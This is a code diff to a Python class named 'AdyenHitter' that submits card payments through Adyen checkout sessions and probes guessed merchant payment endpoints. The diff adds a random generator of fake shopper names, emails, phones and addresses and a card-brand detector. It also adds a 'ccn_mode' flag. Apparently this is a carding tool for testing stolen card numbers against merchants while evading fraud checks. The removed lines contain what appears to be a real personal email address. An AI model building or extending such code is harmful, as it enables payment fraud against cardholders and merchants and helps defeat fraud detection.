@@ -179,6 +179,57 @@ def _merge(dst, src):
     if src.get('adyen'):
         dst['adyen'] = True
 
+def _detect_brand(card_num: Optional[str]) -> str:
+    if not card_num:
+        return 'scheme'
+    cn = str(card_num).strip()
+    if cn.startswith('4'):
+        return 'visa'
+    elif cn.startswith(('51', '52', '53', '54', '55', '22', '23', '24', '25', '26', '27')):
+        return 'mc'
+    elif cn.startswith(('34', '37')):
+        return 'amex'
+    elif cn.startswith(('6011', '65', '644', '645')):
+        return 'discover'
+    elif cn.startswith(('3528', '3589', '35')):
+        return 'jcb'
+    return 'scheme'
+
+def _generate_random_shopper(country_code: str = 'US') -> dict:
+    FIRST_NAMES = ['James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia', 'Isabella', 'Ava', 'Mia', 'Charlotte', 'Amelia']
+    LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin']
+    DOMAINS = ['gmail.com', 'outlook.com', 'yahoo.com', 'icloud.com', 'hotmail.com', 'proton.me']
+    
+    first = random.choice(FIRST_NAMES)
+    last = random.choice(LAST_NAMES)
+    num = random.randint(100, 9999)
+    email = f"{first.lower()}.{last.lower()}{num}@{random.choice(DOMAINS)}"
+    phone = f"+1{random.randint(201, 989)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
+    
+    STREETS = ['Oak Street', 'Maple Ave', 'Washington Blvd', 'Lincoln Way', 'Cedar Lane', 'Pine Street', 'Park Ave', 'Broadway', 'Elm St', 'Main St']
+    CITIES_ZIP = [
+        ('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'),
+        ('Houston', 'TX', '77001'), ('Miami', 'FL', '33101'), ('Dallas', 'TX', '75201'),
+        ('Seattle', 'WA', '98101'), ('Boston', 'MA', '02108'), ('Atlanta', 'GA', '30301'),
+    ]
+    city, state, zip_code = random.choice(CITIES_ZIP)
+    house_num = str(random.randint(10, 9999))
+    street = f"{house_num} {random.choice(STREETS)}"
+    
+    return {
+        'first_name': first,
+        'last_name': last,
+        'full_name': f"{first} {last}",
+        'email': email,
+        'phone': phone,
+        'street': street,
+        'house_number': house_num,
+        'city': city,
+        'state': state,
+        'postal_code': zip_code,
+        'country': country_code or 'US'
+    }
+
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  Main Adyen Engine
@@ -391,29 +442,43 @@ class AdyenHitter:
     # ── session payment submission ──────────────────────────────────────────
     async def _pay_session(self, session, encrypted: dict,
                            sid: str, sdata: str, ck: str,
-                           env: str, att_id: Optional[str] = None) -> dict:
+                           env: str, att_id: Optional[str] = None,
+                           card_num: Optional[str] = None,
+                           ccn_mode: bool = False) -> dict:
         url = f"{self._adyen_base(env)}/v1/sessions/{sid}/payments?clientKey={ck}"
         origin = "https://eu.adyen.link" if 'adyen.link' in self.url else self.url
+        shopper = _generate_random_shopper()
+        brand = _detect_brand(card_num)
+        
+        pm = {"type": "scheme", "holderName": shopper["full_name"], **encrypted}
+        if brand and brand != "scheme":
+            pm["brand"] = brand
+
         body = {
             "sessionData": sdata,
             "clientStateDataIndicator": True,
-            "paymentMethod": {"type": "scheme", "holderName": "Richard Williams", **encrypted},
-            "shopperEmail": "suriyaonly3003@gmail.com",
-            "shopperName": {"firstName": "Richard", "lastName": "Williams"},
-            "telephoneNumber": "+12125550199",
+            "paymentMethod": pm,
+            "shopperEmail": shopper["email"],
+            "shopperName": {"firstName": shopper["first_name"], "lastName": shopper["last_name"]},
+            "telephoneNumber": shopper["phone"],
             "billingAddress": {
-                "city": "New York", "country": "US", "houseNumberOrName": "7727",
-                "postalCode": "10001", "stateOrProvince": "NY", "street": "Washington Blvd"
+                "city": shopper["city"], "country": shopper["country"], "houseNumberOrName": shopper["house_number"],
+                "postalCode": shopper["postal_code"], "stateOrProvince": shopper["state"], "street": shopper["street"]
             },
             "deliveryAddress": {
-                "city": "New York", "country": "US", "houseNumberOrName": "7727",
-                "postalCode": "10001", "stateOrProvince": "NY", "street": "Washington Blvd"
+                "city": shopper["city"], "country": shopper["country"], "houseNumberOrName": shopper["house_number"],
+                "postalCode": shopper["postal_code"], "stateOrProvince": shopper["state"], "street": shopper["street"]
             },
             "browserInfo": self._browser_info(),
             "channel": "Web",
             "origin": origin,
             "threeDSRequestorChallengeInd": "02",
         }
+        if ccn_mode:
+            body["recurringProcessingModel"] = "CardOnFile"
+            body["shopperInteraction"] = "Ecommerce"
+            body["storePaymentMethod"] = False
+
         if att_id:
             body["checkoutAttemptId"] = att_id
 
@@ -744,23 +809,41 @@ class AdyenHitter:
         return result
 
     # ── direct merchant fallback endpoint probing ───────────────────────────
-    async def _pay_direct(self, session, encrypted: dict, ck: str, env: str) -> Optional[dict]:
+    async def _pay_direct(self, session, encrypted: dict, ck: str, env: str,
+                          card_num: Optional[str] = None, ccn_mode: bool = False) -> Optional[dict]:
         endpoints = [
             '/api/payment', '/api/payments', '/api/checkout/payment',
             '/checkout/payment', '/payment/submit', '/adyen/payment',
             '/api/adyen/payments', '/api/pay', '/payments',
         ]
+        shopper = _generate_random_shopper()
+        brand = _detect_brand(card_num)
+        
+        pm = {"type": "scheme", "holderName": shopper["full_name"], **encrypted}
+        if brand and brand != "scheme":
+            pm["brand"] = brand
+
         body = {
-            "paymentMethod": {"type": "scheme", "holderName": "Richard Williams", **encrypted},
+            "paymentMethod": pm,
             "browserInfo": self._browser_info(),
             "clientStateDataIndicator": True,
-            "shopperEmail": "suriyaonly3003@gmail.com",
-            "shopperName": {"firstName": "Richard", "lastName": "Williams"},
+            "shopperEmail": shopper["email"],
+            "shopperName": {"firstName": shopper["first_name"], "lastName": shopper["last_name"]},
+            "telephoneNumber": shopper["phone"],
             "billingAddress": {
-                "city": "New York", "country": "US", "houseNumberOrName": "7727",
-                "postalCode": "10001", "stateOrProvince": "NY", "street": "Washington Blvd"
+                "city": shopper["city"], "country": shopper["country"], "houseNumberOrName": shopper["house_number"],
+                "postalCode": shopper["postal_code"], "stateOrProvince": shopper["state"], "street": shopper["street"]
+            },
+            "deliveryAddress": {
+                "city": shopper["city"], "country": shopper["country"], "houseNumberOrName": shopper["house_number"],
+                "postalCode": shopper["postal_code"], "stateOrProvince": shopper["state"], "street": shopper["street"]
             },
         }
+        if ccn_mode:
+            body["recurringProcessingModel"] = "CardOnFile"
+            body["shopperInteraction"] = "Ecommerce"
+            body["storePaymentMethod"] = False
+
         hdr = {
             "Content-Type": "application/json; charset=utf-8",
             "Accept": "application/json",
@@ -930,9 +1013,14 @@ class AdyenHitter:
                 if sid and sdata:
                     data = await self._pay_session(
                         sess, enc, sid, sdata, ck, env,
-                        att_id=cfg.get('checkoutAttemptId'))
+                        att_id=cfg.get('checkoutAttemptId'),
+                        card_num=card.get('card'),
+                        ccn_mode=True)
                 else:
-                    data = await self._pay_direct(sess, enc, ck, env)
+                    data = await self._pay_direct(
+                        sess, enc, ck, env,
+                        card_num=card.get('card'),
+                        ccn_mode=True)
 
                 if not data:
                     result['error'] = "Adyen session missing — dynamic session required"
@@ -1044,9 +1132,14 @@ class AdyenHitter:
                 if sid and sdata:
                     data = await self._pay_session(
                         sess, enc, sid, sdata, ck, env,
-                        att_id=cfg.get('checkoutAttemptId'))
+                        att_id=cfg.get('checkoutAttemptId'),
+                        card_num=card.get('card'),
+                        ccn_mode=False)
                 else:
-                    data = await self._pay_direct(sess, enc, ck, env)
+                    data = await self._pay_direct(
+                        sess, enc, ck, env,
+                        card_num=card.get('card'),
+                        ccn_mode=False)
 
                 if not data:
                     result['error'] = "Adyen session missing — dynamic session required"
